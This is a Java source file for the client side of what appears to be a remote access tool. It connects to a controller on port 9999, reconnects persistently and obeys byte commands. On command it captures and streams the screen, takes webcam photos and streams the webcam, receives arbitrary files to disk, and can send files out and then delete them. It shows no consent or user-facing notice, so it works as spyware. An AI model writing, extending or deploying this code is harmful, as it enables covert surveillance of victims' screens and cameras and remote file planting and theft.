import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.Socket;
import java.net.UnknownHostException;
import java.text.SimpleDateFormat;
import java.util.Date;

import javax.imageio.ImageIO;
import javax.imageio.stream.MemoryCacheImageOutputStream;

import org.apache.commons.imaging.ImageFormat;
import org.apache.commons.imaging.ImageWriteException;
import org.apache.commons.imaging.Imaging;

import com.github.sarxos.webcam.Webcam;

public class Client {

	/**
	 * @param args
	 */
	Socket socket;
	DataInputStream is;
	DataOutputStream os;
	boolean videoOn = false, webcamOn = false;
	long socketId = -1;

	Client(String ip, int port) throws UnknownHostException {

		try {
			socket = new Socket(ip, port);
			is = new DataInputStream(socket.getInputStream());
			os = new DataOutputStream(socket.getOutputStream());

			giveSocketId(is.readLong());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			retry(ip, port);
		}
	}

	Socket getSocket() {
		return socket;
	}

	void retry(String ip, int port) {
		try {
			Thread.sleep(60 * 1000);
		} catch (InterruptedException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
		try {
			socket = new Socket(ip, port);
			is = new DataInputStream(socket.getInputStream());
			os = new DataOutputStream(socket.getOutputStream());
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			retry(ip, port);
		}
	}

	void giveSocketId(long socketId) {
		System.out.println("Socket Id is: " + socketId);
		this.socketId = socketId;
	}

	long getSocketId() {
		return socketId;
	}

	void waitForCommand() {
		Thread thread = new Thread(new Runnable() {
			boolean running = true;
			int count = 0;

			boolean isRunning() {
				return running;
			}

			void stop() {
				running = false;
			}

			@Override
			public void run() {
				int c;
				while (running) {
					try {
						c = is.read();
						if (c == 224) {
							os.write(224);
							System.out.println("Read code 224");
							takeScreenshot();

						} else if(c == 221) {
							System.out.println("Pressed V");
							os.write(221);
							try {
								Thread.sleep(2000);
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							takeVideoStream();
						} else if (c == 220) {
							System.out.println("Ready to receive file.");
							receiveFile();
						} else if (c == 225) {
							takePicture();
						} else if(c == 222) {
							stopVideoStream();
							stopWebcamStream();
							os.flush();
							
							GUI.icon = null;
//							GUI.screen.setIcon(GUI.icon);
							System.out.println("Stopping video");
						} else if(c == 223) {
							os.write(221);
							try {
								Thread.sleep(2000);
							} catch (InterruptedException e) {
								// TODO Auto-generated catch block
								e.printStackTrace();
							}
							takeWebcamStream();
						}else if (c == -1) {
							System.out.println("Server switched off.");
							is.close();
							os.close();
							socket.close();
							stop();

							break;
						}
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						try {
							Thread.sleep(15 * 1000);
							count += 1;
						} catch (InterruptedException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
						if (count == 10) {
							break;
						}
					} catch (AWTException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						break;
					}

				}
			}
		});

		thread.start();

	}

	void takePicture() throws IOException {
		Date date = new Date();
		SimpleDateFormat dateFormat = new SimpleDateFormat(
				"yyyy-MM-dd-HH-mm-ss");
		String fileName = getSocketId() + "-webcam-" + dateFormat.format(date)
				+ ".png";

		Webcam webcam = Webcam.getDefault();

		webcam.setViewSize(new Dimension(640, 480));
		webcam.open();
		BufferedImage image = webcam.getImage();
		webcam.close();
		System.out.println("Transferring Picture");

		os.write(20);

		byte[] name = fileName.getBytes();
		int nameChars = name.length;
		os.writeInt(nameChars);
		for (int i = 0; i < nameChars; i++) {
			os.write(name[i]);
		}

		ByteArrayOutputStream baos = new ByteArrayOutputStream();

		ImageIO.write(image, "PNG", baos);
		baos.flush();
		byte[] imageInByte = baos.toByteArray();
		long imageSize = imageInByte.length;

		os.writeLong(imageSize);

		for (long i = 0; i < imageSize; i++) {
			os.write(imageInByte[(int) i]);
		}

	}
	
	void takeWebcamStream() {

		System.out.println("Taking video stream");
		
		Thread thread = new Thread(new Runnable() {

			@Override
			public void run() {
				webcamOn = true;
				Webcam webcam = null;
				try {
					webcam = Webcam.getDefault();

					webcam.setViewSize(new Dimension(640, 480));
					webcam.open();
					
					int count = 0;
					while (webcamOn) {
						BufferedImage image = webcam.getImage();
						BufferedImage outputImage = new BufferedImage(1000,
				                667, BufferedImage.TYPE_INT_RGB); 
						
						Graphics2D g2d = outputImage.createGraphics();
				        g2d.drawImage(image, 0, 0, 1000, 667, null);
				        g2d.dispose();
				        count++;
						try {
							System.out.println("Sending image no: " + count);
							ImageIO.write(image, "PNG", new MemoryCacheImageOutputStream(os));
//							try {
//								Imaging.writeImage(image, os, ImageFormat.IMAGE_FORMAT_PNG, null);
//							} catch (ImageWriteException e) {
//								// TODO Auto-generated catch block
//								e.printStackTrace();
//							}
						} catch (IOException e1) {
							// TODO Auto-generated catch block
							e1.printStackTrace();
						}
						try {
							Thread.sleep(33); // 66 for 15fps, 33 for 30fps.
						} catch (InterruptedException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				} finally  {
					webcam.close();
				}

			}

		});
		thread.start();
	}
	
	void stopWebcamStream() {
		webcamOn = false;
	}
	
	
	void takeVideoStream() {
		System.out.println("Taking video stream");
		
		Thread thread = new Thread(new Runnable() {

			@Override
			public void run() {
				videoOn = true;
				Robot robo;
				try {
					robo = new Robot();
					int count = 0;
					while (videoOn) {
						BufferedImage image = robo
								.createScreenCapture(new Rectangle(Toolkit
										.getDefaultToolkit().getScreenSize()));
						
						BufferedImage outputImage = new BufferedImage(1000,
				                667, image.getType()); 
						
						Graphics2D g2d = outputImage.createGraphics();
				        g2d.drawImage(image, 0, 0, 1000, 667, null);
				        g2d.dispose();
				        count++;
						System.out.println("Sending image no: " + count);
							try {
								ImageIO.write(outputImage, "png", new MemoryCacheImageOutputStream(os));
							} catch (IOException e1) {
								// TODO Auto-generated catch block
								e1.printStackTrace();
							}
						try {
							Thread.sleep(33); // 66 for 15fps, 33 for 30fps.
						} catch (InterruptedException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					}
				} catch (AWTException e1) {
					// TODO Auto-generated catch block
					e1.printStackTrace();
				}

			}

		});
		thread.start();

	}

	void stopVideoStream() {
		System.out.println("Stopping stream.");
		videoOn = false;
	}

	void takeScreenshot() throws AWTException, IOException {
		System.out.println("Taking screenshot");
		Robot robo = new Robot();
		BufferedImage image = robo.createScreenCapture(new Rectangle(Toolkit
				.getDefaultToolkit().getScreenSize()));

		Date date = new Date();
		SimpleDateFormat dateFormat = new SimpleDateFormat(
				"yyyy-MM-dd-HH-mm-ss");
		String fileName = getSocketId() + "-screenshot-"
				+ dateFormat.format(date) + ".png";

		System.out.println("Transferring screenshot");

		os.write(20);

		byte[] name = fileName.getBytes();
		int nameChars = name.length;
		os.writeInt(nameChars);
		for (int i = 0; i < nameChars; i++) {
			os.write(name[i]);
		}

		ByteArrayOutputStream baos = new ByteArrayOutputStream();

		ImageIO.write(image, "PNG", baos);
		baos.flush();
		byte[] imageInByte = baos.toByteArray();
		long imageSize = imageInByte.length;

		os.writeLong(imageSize);

		for (long i = 0; i < imageSize; i++) {
			os.write(imageInByte[(int) i]);
		}

		System.out.println("Done.");
		// transferFile(fileName);
	}

	void transferFile(String url) throws IOException {
		FileInputStream fis = new FileInputStream(url);
		int c;
		long count = 0;
		while ((c = fis.read()) != -1) {
			count++;
		}
		fis.close();

		os.writeLong(count);

		byte[] name = url.getBytes();
		int nameChars = name.length;

		os.writeInt(nameChars);

		for (int i = 0; i < nameChars; i++) {
			os.write(name[i]);
		}
		fis.close();

		FileInputStream fis2 = new FileInputStream(url);
		while ((c = fis2.read()) != -1) {
			os.write(c);
		}
		os.flush();
		fis2.close();
		File file = new File(url);
		file.delete();
		System.out.println("Done.");
	}

	void receiveFile() throws IOException {
		int fileLength = is.readInt();
		byte[] fileLengthByte = new byte[fileLength];
		for (int i = 0; i < fileLength; i++) {
			fileLengthByte[i] = (byte) is.read();
		}
		String fileName = new String(fileLengthByte);
		FileOutputStream fos = new FileOutputStream(fileName);

		long fileSize = is.readLong();

		for (long i = 0; i < fileSize; i++) {
			fos.write(is.read());
		}
		fos.close();
		System.out.println("Received");
	}

	public static void main(String[] args) throws UnknownHostException,
			IOException {
				
		String ip;
		if (args.length > 0) {
			ip = args[0];
		} else {
			ip = "127.0.0.1";
		}
		// TODO Auto-generated method stub
		while (true) {
			System.out.println("Connecting to " + ip + "...");
			
			Client client = new Client(ip, 9999);

			client.waitForCommand();
			while (!client.getSocket().isClosed()) {
				try {
					Thread.sleep(1 * 60 * 1000);
				} catch (InterruptedException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}
		}

	}
}
